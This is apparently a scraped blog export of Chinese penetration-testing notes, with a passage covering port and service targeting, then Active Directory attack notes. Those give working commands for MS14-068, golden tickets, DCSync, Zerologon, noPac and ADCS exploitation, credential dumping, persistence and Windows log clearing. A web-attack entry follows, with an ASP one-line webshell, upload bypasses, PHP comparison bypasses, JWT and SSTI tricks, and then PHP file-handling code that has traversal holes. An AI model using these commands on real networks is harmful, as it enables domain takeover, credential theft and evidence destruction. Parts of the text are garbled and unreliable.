\n…\n\napacheftp…\n常见的默认端口1、web类(web漏洞&#x2F;敏感目录)第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix …\ntxt80 web \n80-89 web \n8000-9090 web 2、数据库类(扫描弱口令)txt1433 MSSQL \n1521 Oracle \n3306 MySQL \n5432 PostgreSQL \n50000 DB23、特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)txt443 SSL心脏滴血 \n445 ms08067/ms11058/ms17010等 \n873 Rsync未授权 \n5984 CouchDB http://xxx:5984/_utils/ \n6379 redis未授权 \n7001,7002 WebLogic默认弱口令，反序列 \n9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 \n11211 memcache未授权访问 \n27017,27018 Mongodb未授权访问 \n50000 SAP命令执行 \n50070,50030 hadoop默认端口未授权访问 4、常用端口类(扫描弱口令&#x2F;端口爆破)txt21 ftp \n22 SSH \n23 Telnet \n445 SMB弱口令扫描 \n2601,2604 zebra路由，默认密码zebra \n3389 远程桌面 5、端口合计所对应的服务txt21 ftp \n22 SSH \n23 Telnet \n25 SMTP \n53 DNS \n69 TFTP \n80 web \n80-89 web \n110 POP3 \n135 RPC \n139 NETBIOS \n143 IMAP \n161 SNMP \n389 LDAP \n443 SSL心脏滴血以及一些web漏洞测试 \n445 SMB \n512,513,514 Rexec \n873 Rsync未授权 \n1025,111 NFS \n1080 socks \n1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 \n1433 MSSQL (暴力破解) \n1521 Oracle:(iSqlPlus Port:5560,7778) \n2082/2083 cpanel主机管理系统登陆 （国外用较多） \n2222 DA虚拟主机管理系统登陆 （国外用较多） \n2601,2604 zebra路由，默认密码zebra \n3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 \n3306 MySQL （暴力破解） \n3312/3311 kangle主机管理系统登陆 \n3389 远程桌面 \n3690 svn \n4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 \n4848 GlassFish web中间件 弱口令:admin/adminadmin \n5432 PostgreSQL \n5900 vnc \n5984 CouchDB http://xxx:5984/_utils/ \n6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 \n6379 redis未授权 \n7001,7002 WebLogic默认弱口令，反序列 \n7778 Kloxo主机控制面板登录 \n8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 \n8080 tomcat/WDCd/ 主机管理系统，默认弱口令 \n8080,8089,9090 JBOSS \n8081 Symantec AV/Filter for MSE \n8083 Vestacp主机管理系统 （国外用较多） \n8649 ganglia \n8888 amh/LuManager 主机管理系统默认端口 \n9000 fcgi fcig php执行 \n9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager \n9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 \n10000 Virtualmin/Webmin 服务器虚拟主机管理系统 \n11211 memcache未授权访问 \n27017,27018 Mongodb未授权访问 \n28017 mongodb统计页面 \n50000 SAP命令执行 \n50060 hadoop \n50070,50030 hadoop默认端口未授权访问域渗透信息搜集powerview.ps1txtGet-NetDomain - gets the name of the current user&#39;s domain\nGet-NetForest - gets the forest associated with the current user&#39;s domain\nGet-NetForestDomains - gets all domains for the current forest\nGet-NetDomainControllers - gets the domain controllers for the current computer&#39;s domain\nGet-NetCurrentUser - gets the current [domain\\]username\nGet-NetUser - returns all user objects, or the user specified (wildcard specifiable)\nGet-NetUserSPNs - gets all user ServicePrincipalNames\nGet-NetOUs - gets data for domain organization units\nGet-NetGUIDOUs - finds domain OUs linked to a specific GUID\nInvoke-NetUserAdd - adds a local or domain user\nGet-NetGroups - gets a list of all current groups in the domain\nGet-NetGroup - gets data for each user in a specified domain group\nGet-NetLocalGroups - gets a list of localgroups on a remote host or hosts\nGet-NetLocalGroup - gets the members of a localgroup on a remote host or hosts\nGet-NetLocalServices - gets a list of running services/paths on a remote host or hosts\nInvoke-NetGroupUserAdd - adds a user to a specified local or domain group\nGet-NetComputers - gets a list of all current servers in the domain\nGet-NetFileServers - get a list of file servers used by current domain users\nGet-NetShare - gets share information for a specified server\nGet-NetLoggedon - gets users actively logged onto a specified server\nGet-NetSessions - gets active sessions on a specified server\nGet-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles\nGet-NetConnections - gets active connections to a specific server resource (share)\nGet-NetFiles - gets open files on a server\nGet-NetProcesses - gets the remote processes and owners on a remote serverPowerView-2.0-tricks:\ntxthttps://gist.github.com/HarmJ0y/3328d954607d71362e3cPowerView-3.0-tricks\ntxthttps://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993BloodHound获取某OU下所有机器信息\ntxt&#123;\n            &quot;name&quot;: &quot;Find the specificed OU computers&quot;,\n            &quot;queryList&quot;: [\n                &#123;\n                    &quot;final&quot;: false,\n                    &quot;title&quot;: &quot;Select a OU...&quot;,\n                    &quot;query&quot;: &quot;MATCH (n:OU) RETURN distinct n.name ORDER BY n.name DESC&quot;\n                &#125;,\n                &#123;\n                    &quot;final&quot;: true,\n                    &quot;query&quot;: &quot;MATCH (m:OU  &#123;name: $result&#125;) with m MATCH p=(o:OU &#123;objectid: m.objectid&#125;)-[r:Contains*1..]-&gt;(n:Computer) RETURN p&quot;,\n                    &quot;allowCollapse&quot;: true,\n                    &quot;endNode&quot;: &quot;&#123;&#125;&quot;\n                &#125;\n            ]\n        &#125;自动标记owned用户及机器\nSyncDog\n获取域内DNS信息\nadidnsdump\n域渗透——DNS记录的获取​\n\n获取域控的方法SYSVOLSYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。相关阅读: \n\n寻找SYSVOL里的密码和攻击GPP（组策略偏好） \nWindows Server 2008 R2之四管理Sysvol文件夹 \nSYSVOL中查找密码并利用组策略首选项 \n利用SYSVOL还原组策略中保存的密码\n\nMS14-068 Kerberostxtpython ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机利用mimikatz将工具得到的&#84;&#71;&#x54;&#x5f;&#x64;&#111;&#109;&#x61;&#105;&#x6e;&#x75;&#x73;&#101;&#x72;&#64;&#83;&#x45;&#x52;&#x56;&#69;&#x52;&#x2e;&#67;&#79;&#x4d;&#46;&#x63;&#x63;&#97;&#99;&#x68;&#101;写入内存，创建缓存证书：\ntxtmimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit\nnet use k: \\pentest.comc$相关阅读 :\n\nKerberos的工具包PyKEK \n深入解读MS14-068漏洞\nKerberos的安全漏洞\n\nSPN扫描Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。相关阅读 :\n\n非扫描式的SQL Server发现 \nSPN扫描 \n扫描SQLServer的脚本\n\nKerberos的黄金门票在域上抓取的哈希\ntxtlsadump::dcsync /domain:pentest.com /user:krbtgttxtkerberos::purge\nkerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi\nkerberos::ptt administrator.kiribi\nkerberos::tgt\nnet use k: \\pnet use k: \\pentest.comc$相关阅读 :\n\nhttps://adsecurity.org/?p=1640 \n域服务账号破解实践 \nKerberos的认证原理 \n深刻理解windows安全认证机制ntlm＆Kerberos\n\nKerberos的银票务黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限银票：伪造TGS，只能访问指定的服务加密方式不同：Golden Ticket由krbtgt的hash加密Silver Ticket由服务账号（通常为计算机账户）Hash加密认证流程不同：金票在使用的过程需要同域控通信银票在使用的过程不需要同域控通信相关阅读 :\n\n攻击者如何使用Kerberos的银票来利用系统 \n域渗透——Pass The Ticket\n\n域服务账号破解与上面SPN扫描类似的原理https://github.com/nidem/kerberoast获取所有用作SPN的帐户\ntxtsetspn -T PENTEST.com -Q */*从Mimikatz的RAM中提取获得的门票\ntxtkerberos::list /export用rgsrepcrack破解\ntxttgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi凭证盗窃从搜集的密码里面找管理员的密码 \nNTLM relay\nOne API call away from Domain Admin\nprivexchange\nExchange2domain\n\n用于主动让目标机器发起NTLM请求的方法：\n\nprinterbug\nPetitPotam\n\nRelay LDAP:\n\nCVE-2019-1040-dcpwn\n\nRelay AD CS&#x2F;PKI:\n\nAD CS&#x2F;PKI template exploit\n\n集成几个利用的工具：\n\nRelayx\n\n内网445端口转发：\n\nPortBender\n\nKerberos委派\nWagging-the-Dog.html\ns4u2pwnage\nAttacking Kerberos Delegation\n用打印服务获取域控\nComputer Takeover\nCombining NTLM Relaying and Kerberos delegation\nCVE-2019-1040\n\n地址解析协议实在搞不定再搞ARP \nZerologon1、利用Mimikatzcheck\ntxtlsadump::zerologon /target:dc1.exploit.local /account:dc1$exploit\ntxtlsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploitdcsync\ntxtlsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:&quot;&quot; /domain:exploit.local /authntlm /user:krbtgtrestore\ntxtlsadump::postzerologon /target:conttosson.locl /account:dc$ 2、利用impacket：\n\n取目标主机名+IP\ninstall 修改版本的impacket\nExp\n\ntxtpython cve-2020-1472-exploit.py DC2008 10.211.55.200\ntxtsecretsdump.py -no-pass cgdomain.com/&#39;DC2008$&#39;@10.211.55.200 -history -just-dc-user administratortxtsecretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae\n获取到旧的密码明文hex，还原\ntxtpython restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b\n恢复方法2通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)\ntxtwmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38然后分别执行,拷贝本机中SAM数据库到本地\ntxt- reg save HKLM\\SYSTEM system.save\n- reg save HKLM\\SAM sam.save\n- reg save HKLM\\SECURITY security.save\n- get system.save\n- get sam.save\n- get security.save\n- del /f system.save\n- del /f sam.save\n- del /f security.save提取明文hash\ntxtsecretsdump.py -sam sam.save -system system.save -security security.save LOCAL然后恢复。​    \nnoPac漏洞分析：CVE-2021-42287&#x2F;CVE-2021-42278 Weaponisation\nExploit：\ntxt# Create Machine Account\nNew-MachineAccount -MachineAccount TestSPN -Domain internal.zeroday.lab -DomainController idc1.internal.zeroday.lab -Verbose\n\n# Clear SPNs\nSet-DomainObject &quot;CN=TestSPN,CN=Computers,DC=internal,DC=zeroday,DC=lab&quot; -Clear &#39;serviceprincipalname&#39; -Verbose\n\n# Change Machine Account samaccountname\nSet-MachineAccountAttribute -MachineAccount TestSPN -Value &quot;IDC1&quot; -Attribute samaccountname -Verbose\n\n# Request TGT\n.\\Rubeus.exe asktgt /user:IDC1 /password:Password1 /domain:internal.zeroday.lab /dc:idc1.internal.zeroday.lab /nowrap\n\n# Change Machine Account samaccountname\nSet-MachineAccountAttribute -MachineAccount TestSPN -Value &quot;TestSPN&quot; -Attribute samaccountname -Verbose\n\n# Request S4U2self\n.\\Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:idc1.internal.zeroday.lab /self /altservice:LDAP/IDC1.internal.zeroday.lab /ptt /ticket:[TGT]\n一键利用：noPac\nADCS利用ADCS中错误配置的模板进行域提权，详细可参考：Certified_Pre-Owned\n可利用工具：\n\nCertify\nCertipy\nPKINITtools\ncerti\n\nCVE-2022-26923前提：域内有ADCSExploit:\ntxt# 修改可控机器DNS\npython certi.py account create cgdomain.com/sanfeng:&#39;1qazXSW@&#39;@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns dc2008.cgdomain.com\n\n# 请求证书\npython certi.py req &#39;cgdomain.com/testvul$:NUxhMemzaP4rsPnu&#39;@10.211.55.200 -dc-ip 10.211.55.200 -ca cgdomain-DC2008-CA -template &#39;Machine&#39;\n\n# 获取DC hash\npython certi.py auth -dc-ip 10.211.55.200 -pfx dc2008.pfx -username dc2008$\n\n# 还原机器DNS\npython certi.py account update cgdomain.com/sanfeng:&#39;1qazXSW@&#39;@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns testvul.hqcec.com\n\n\n\n\n\n\n\n\n注：此环境的ADCS与DC为同一台机器。真实环境需要根据实际情况进行参数调整。\n获取AD哈希\n使用VSS卷影副本 \nNtdsutil中获取NTDS.DIT​​文件 \nPowerShell中提取NTDS.DIT –&gt;Invoke-NinaCopy \n使用Mimikatz提取\n\ntxtmimikatz lsadump::lsa /inject exit \n使用PowerShell Mimikatz\n使用Mimikatz的DCSync 远程转储Active Directory凭证提取 KRBTGT用户帐户的密码数据：\n\ntxtMimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt&quot;exit管理员用户帐户提取密码数据：\ntxtMimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator&quot; exit\n\nNTDS.dit中提取哈希使用esedbexport恢复以后使用ntdsxtract提取\n\nAD持久化活动目录持久性技巧https://adsecurity.org/?p=1929DS恢复模式密码维护DSRM密码同步 \n\n\n\n\n\n\n\n\n\nWindows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)\nDCshadow \nSecurity Support Provider简单的理解为SSP就是一个DLL，用来实现身份认证\ntxtprivilege::debug\nmisc::memssp这样就不需要重启c:/windows/system32可看到新生成的文件kiwissp.log\nSID HistorySID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户\ntxtmimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;AdminSDHolder＆SDProp 利用AdminSDHolder＆SDProp（重新）获取域管理权限 \n组策略https://adsecurity.org/?p=2716策略对象在持久化及横向渗透中的应用 \nHook PasswordChangeNotifyhttp://www.vuln.cn/6812\nKerberoasting后门域渗透-Kerberoasting\nAdminSDHolderBackdooring AdminSDHolder for Persistence\nDelegationUnconstrained Domain Persistence\n黄金证书certified-pre-owned\n证书伪造：pyForgeCert\n其他域内主机提权SharpAddDomainMachine\nExchange的利用\nowa_info\nExchange2domain\nCVE-2018-8581\nCVE-2019-1040 \nCVE-2020-0688\nNtlmRelayToEWS\newsManage\nCVE-2021-26855\nCVE-2021-28482\nProxyVulns\nProxyNotShell\nOWASSRF-ProxyNotShell\nTabshell\n\nTIPS《域渗透——Dump Clear-Text Password after KB2871997 installed》\n《域渗透——Hook PasswordChangeNotify》 \n\n\n\n\n\n\n\n\n\n可通过Hook PasswordChangeNotify实时记录域控管理员的新密码 \n《域渗透——Local Administrator Password Solution》 \n\n\n\n\n\n\n\n\n\n域渗透时要记得留意域内主机的本地管理员账号 \n《域渗透——利用SYSVOL还原组策略中保存的密码》 \n相关工具\nBloodHound \n\nCrackMapExec \n\nDeathStar \n\n\n\n\n\n\n\n\n\n利用过程：http://www.freebuf.com/sectool/160884.html\n\n\n在远程系统上执行程序\nAt \nPsexec \nWMIC \nWmiexec \nSmbexec \nPowershell remoting \nDCOM \nWinrm (https://github.com/Hackplayers/evil-winrm)\n\nIOT相关\n1、路由器 routersploit \n2、打印机 PRET \n3、IOT exp https://www.exploitee.rs/\n4、相关OWASP-Nettackerisficsmaster\n\n中间人\nCain \nEttercap \nResponder \nMITMf \n3r&#x2F;MITMf)\n\n规避杀软及检测Bypass ApplockerUltimateAppLockerByPassList https://lolbas-project.github.io/ \nBypassAV\nEmpire \nPEspin \nShellter \nEbowla \nVeil \nPowerShell \nPython \n代码注入技术Process Doppelgänging \n…\n\n痕迹清理Windows日志清除获取日志分类列表：\ntxtwevtutil el &gt;1.txt获取单个日志类别的统计信息：eg.\ntxtwevtutil gli &quot;windows powershell&quot;回显：\ntxtcreationTime: 2016-11-28T06:01:37.986Z\nlastAccessTime: 2016-11-28T06:01:37.986Z\nlastWriteTime: 2017-08-08T08:01:20.979Z\nfileSize: 1118208\nattributes: 32\nnumberOfLogRecords: 1228\noldestRecordNumber: 1查看指定日志的具体内容：\ntxtwevtutil qe /f:text &quot;windows powershell&quot;删除单个日志类别的所有信息：\ntxtwevtutil cl &quot;windows powershell&quot;破坏Windows日志记录功能利用工具 \n\nInvoke-Phant0m \nWindwos-EventLog-Bypass\n\nMetasploittxtrun clearlogs txtclearev 3389登陆记录清除txt@echo off\n@reg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot; /va /f\n@del &quot;%USERPROFILE%\\My Documents\\Default.rdp&quot; /a\n@exit","slug":"转-知识点合集","date":"2024-03-05T15:07:07.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"b69c40d42a331389a30f55c12f4711cf","title":"WEB攻防-特性漏洞","content":"ASP安全\n常用组合: windows+IIS+ASP+Access(sql server)\n\n安全问题:MDB默认下载\naccess数据库文件后缀名一般为asp&#x2F;asa&#x2F;mdb\n其中, 浏览器访问asp&#x2F;asa文件时, 文件会被解析执行, 访问mdb文件时会下载该文件\n由此可以获取站点敏感数据\n\nASP后门植入连接\n留言板写入一句话木马:\ntxt┼攠數畣整爠煥敵瑳∨≡┩愾\n密码为a\n\n\n原理: 网站开启了asp解析，直接访问数据库文件会返回信息，写入一句话木马后进行连接\n\n\nIIS短文件名探针安全漏洞\n原理: \nWindows系统为了兼容16位MS-DOS程序，为文件名较长的文件和文件夹生成了对应的Windows 8.3短文件名。比如文件名direct~1.asp中间有一个波浪号，这种就是短文件名了\n\n\n利用:\n使用脚本扫描网站目录造成敏感信息泄露（不同于使用字典扫描）\n\n\n\n中间件IIS文件上传解析\n流程：发现网站存在上传点–上传asp木马–若存在文件名监测通过修改文件类型绕过检测–shell工具连接\n\n1.jpg文件无法解析，修改为1.asp;.jpg即可绕过。或者1.jpg文件放在a.asp文件下也可进行解析\n\n\nIIS配置目录读写\n当网站为IIS6.0且开启写入权限、开启web服务拓展WebDAV则存在此漏洞\n\nput攻击\nput协议，当我们浏览某个网站，访问某个资源时，如果网站存在这个资源，则会进行替换，若网站不存在这个资源，则会创建这个资源\n可以用工具利用put直接写shell  (桂林老兵)\n\n.NET项目(ASPX)\nwindows+iis+aspx+sqlserver\n\ndll反编译\n几种工具反编译被编译好的DLL文件-CSDN博客\nicsharpcode&#x2F;ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (&amp;more) - cross-platform! (github.com)\n\n未授权访问\n寻找未授权访问\n找哪些文件没有包含验证代码文件\n验证代码文件有没有可能绕过\n\n\n\nPHP特性&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;==弱类型对比\n场景1 – 缺陷绕过\nphp$a=1;\nif($a==$_GET[&#39;x&#39;])&#123;\n    echo $flag;\n&#125;1.0 +1 1a等均可\n\n场景2 – MD5函数缺陷绕过\nphpif($_GET[&#39;name&#39;] != $_GET[&#39;password&#39;])&#123;\n    if(MD5($_GET[&#39;name&#39;]) == MD5($_GET[&#39;password&#39;]))&#123;\n        echo $flag;\n    &#125;\n    echo &#39;?&#39;;\n&#125;\nQNKCDZO和240610708的MD5值均为0e开头, 会被理解为0乘10的xx次方, 结果为0, 可绕过&#x3D;&#x3D;弱类型对比\nname[]=1&amp;password[]=2数组无法md5加密, 因此两个都会变成none, 可绕过强类型对比\n\n\n场景3 – intval缺陷绕过\nphp$i=&#39;666&#39;;\n$ii=$_GET[&#39;n&#39;];\nif(intval($ii)==$i)&#123;\n    echo $flag;\n&#125;\n// 666.0 +666php$i=&#39;666&#39;;\n$ii=$_GET[&#39;n&#39;];\nif(intval($ii,0)==1)&#123;\n    echo $flag;\n&#125;\n\n//0x29a\nintval带参数0时会自动检测进制\n\n\n场景4 – strpos()函数绕过\nphp$i=&#39;666&#39;;\n$ii=$_GET[&#39;h&#39;];\nif(strpos($ii==$i,&quot;0&quot;))&#123;\n    echo $flag;\n&#125;\n\n//可以利用换行进行绕过（%0a）\n//?num=%0a666\n场景5 – in_array第三个参数安全\nphp$whitelist = [1,2,3];\n$page=$_GET[&#39;i&#39;];\nif (in_array($page, $whitelist)) &#123;\n    echo &quot;yes&quot;;   \n&#125;\n\n//?i=1ex\nin_array()函数不带第三个参数(或为false)时, 会采用==弱类型对比进行判断\n\n\n场景6 – preg_match\nphpif(isset($_GET[&#39;num&#39;]))&#123;\n    $num = $_GET[&#39;num&#39;];\n    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;\n        die(&quot;no no no!&quot;);\n    &#125;\n    if(intval($num))&#123;\n        echo $flag;\n    &#125;\n&#125;\n\n//?num[]=1\npreg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错\n\n\n场景7 – str_replace无法迭代过滤\nphp$sql=$_GET[&#39;s&#39;];\n$sql=str_replace(&#39;select&#39;,&#39;&#39;,$sql);\necho $sql;\n\n//?s=sselectelect\n只能过滤一次\n\n\n\nJavaWeb项目代码逻辑引起漏洞上传文件时的目录遍历\nweb应用可能设置了在上传文件文件的目录禁止执行asp,php文件等(如imgs目录等)\n如果将文件上传到程序根目录, 则可以被执行\n如果过滤逻辑使用的是str_replace, 则只会过滤一次, 可以双写绕过,如....//file.asp\n\n身份认证绕过\n键值逻辑：使用键名键值进行对比验证错误\n如: 需要验证s0, s1, s2, s3中任意一个的信息是否正确, 如果此时传入不存在的s10086, 并赋值为null, 则可以绕过验证\n\n访问控制漏洞\n查看隐藏属性: 已在前端源码, 只是没有显示在屏幕上\n\nJWT攻击JWT原理及常见攻击方式 - yokan - 博客园 (cnblogs.com)\nJWT样式jwt的生成token格式如下，即：由 . 连接的三段字符串组成\ntxteyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\n第一段HEADER部分, 固定包含算法和token类型，对此json进行base64url加密\njson&#123;\n   &quot;alg&quot;: &quot;HS256&quot;,\n   &quot;typ&quot;: &quot;JWT&quot;\n&#125;\n第二段PAYLOAD部分, 包含一些数据，对此json进行base64url加密\njson&#123;\n    &quot;sub&quot;: &quot;1234567890&quot;,\n    &quot;name&quot;: &quot;John Doe&quot;,\n    &quot;iat&quot;: 1516239022\n&#125;\n第三段SIGNATURE部分，把前两段的base密文通过.拼接起来，然后对其进行HS256加密，再然后对hs256密文进行base64url加密，最终得到token的第三段\ntxtbase64url(HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), your-256-bit-secret (秘钥加盐)))\n\n几种攻击思路\n签名没验证空加密\n\n如果签名alg的值可以none, 也就是不加密签名, 签名的值就可以为空\n\n\n爆破密匙\n\n爆破前提:\n知悉JWT使用的加密算法\n一段有效的、已签名的token\n签名用的密钥不复杂（弱密钥）\n\n\n爆破工具\nbrendan-rius&#x2F;c-jwt-cracker: JWT brute force cracker written in C (github.com)\n\n\n\n\nKID利用\n\nkid是jwt header中的一个可选参数，全称是key ID，它用于指定加密算法的密钥\njson&#123;\n    &quot;alg&quot; : &quot;HS256&quot;,\n    &quot;typ&quot; : &quot;jwt&quot;,\n    &quot;kid&quot; : &quot;/home/jwt/.ssh/pem&quot;\n&#125;\n\n\n\n组件安全问题\nJava项目本身安全性较高, 漏洞较少, 安全问题很多出自组件\n\n如XStream的CVE-2013-7285\n\n\nJS项目&amp;Node.Js框架特性\n默认能够得到源码, 相当于白盒测试\n\nJs渗透测试\n在Javascript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞\n\n判断js开发框架(nodejs, vue等)\n插件wappalyzer\ncookie中有connect.sid\n查看源代码\n引入多个文件\n文件结构如&#x2F;static&#x2F;js&#x2F;app.js\n\n安全漏洞\n前端验证\n在前端通过返回状态码验证用户信息\n可以被通过抓取返回数据包绕过\n\n\nurl泄露\n未授权访问\n\nvulhub靶场\nvulhub&#x2F;vulhub: Pre-Built Vulnerable Environments Based on Docker-Compose (github.com)\n\n启用靶场:\n\n进入指定漏洞的目录下如httpd/CVE-xxxx-xxxxx\n开启漏洞环境docker compose up -d(或docker-compose)\n查看端口docker compose ps\n\n\n关闭靶场\n\ndocker compose down\n\n\n\nPython反编译\npy文件编译后产生pyc文件\n\n反编译平台:\n\npython反编译 - 在线工具 (tool.lu)\n在线pyc,pyo,python,py文件反编译，目前支持python1.5到3.6版本的反编译-在线工具 (bugscaner.com)\n\n\n反编译工具\nzrax&#x2F;pycdc: C++ python bytecode disassembler and decompiler (github.com)\n\n\nSSTI漏洞【网络安全 | 1.5w字总结】SSTI漏洞入门，这一篇就够了。-CSDN博客\n1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)\n\n在多种编程语言都有这个漏洞(py, js, go, java)等\n\nSSTI – 服务器端模板注入漏洞\n原理: 服务端将输入作为web应用模板内容的一部分，在进行目标编译渲染的过程中，拼接了恶意语句，因此造成敏感信息泄露、远程命令执行等问题\n\n分类:\n\n检测: 参数提交代码, 是否执行\n\n案例: \npythonname = request.args.get(&#39;name&#39;, &#39;guest&#39;)\nt = Template(&quot;Hello &quot; + name)\nreturn t.render()\n正常情况下, 渲染后name应该直接被输出\n\n\n但如果用双大括号&#123;&#123;&#125;&#125;包裹参数值, 会被作为python代码执行\n\n\n\n\nctf案例:\n\nBUUCTF在线评测 (buuoj.cn)\n\npython学习笔记——flask之渲染模板(Jinja2)-特殊变量和方法_jinja2 flash-CSDN博客\n\n\n\n\n","slug":"WEB攻防-特性漏洞","date":"2024-03-03T06:48:26.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,WEB攻防","author_index":"Myprefer"},{"id":"1f592da3647b8088a97f7f44683fed82","title":"PHP开发","content":"文件操作文件上传php&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;\n    &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;\n    &lt;input type=&quot;file&quot; name=&quot;upload&quot; multiple=&quot;multiple&quot;&gt;\n    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;\n&lt;/form&gt;\n&lt;?php\nif ($_FILES) &#123;\n    $name = $_FILES[&#39;upload&#39;][&#39;name&#39;];\n    $tmp_name = $_FILES[&#39;upload&#39;][&#39;tmp_name&#39;];\n\n    if (!move_uploaded_file($tmp_name, &#39;./files/&#39; . $name)) &#123;\n        echo &quot;&lt;br&gt;文件上传失败!&lt;br&gt;&quot;;\n    &#125;\n&#125;\n?&gt;文件下载直连下载只能下载exe, zip, 等等符合协议的文件类型, 稍微更安全\nphp&lt;?php\nfunction get_url_download($filename) &#123;\n    $url = &#39;http://&#39; . $_SERVER[&#39;HTTP_HOST&#39;] . &#39;/files/&#39; . $filename;\n    header(&quot;location:$url&quot;);\n&#125;\n?&gt;传参下载php&lt;?php\nfunction get_down($filename) &#123;\n    $filedir = &#39;./files/&#39;;\n    if (!file_exists($filedir.$filename)) &#123;\n        header(&#39;HTTP/1.1 404 NOT FOUND&#39;);\n    &#125; else &#123;\n        $file = fopen($filedir.$filename, &#39;rb&#39;);\n        Header(&quot;Content-type: application/octet-stream&quot;);\n        Header(&quot;Accept-Ranges: bytes&quot;);\n        Header(&quot;Accept-Length: &quot; . filesize($filedir . $filename));\n        Header(&quot;Content-Disposition: attachment; filename=&quot; . $filename);\n\n        echo fread($file, filesize($filedir.$filename));\n        fclose($file);\n\n        exit();\n    &#125;\n&#125;\n?&gt;文件删除文件删除php$file_path = &#39;./files/&#39;.$filename;\nif (file_exists($file_path)) &#123;\n    unlink($file_path);\n    echo &#39;文件删除成功&#39;;\n&#125; else &#123;\n    echo &#39;文件不存在&#39;;\n&#125;文件夹删除php$dir_path = &#39;./files/&#39;.$dirname;\nif (is_dir($dir_path)) &#123;\n    rmdir($dir_path);\n    echo &#39;目录删除成功&#39;;\n&#125; else &#123;\n    echo &#39;目录不存在&#39;;\n&#125;文件读取php$filepath = &#39;./files/&#39;.$filename;\n$file = fopen($filepath, &#39;r&#39;) or die(&#39;无法打开文件!&#39;);\necho &quot;&lt;h4&gt;文件内容:&lt;/h4&gt;&quot;;\necho fread($file, 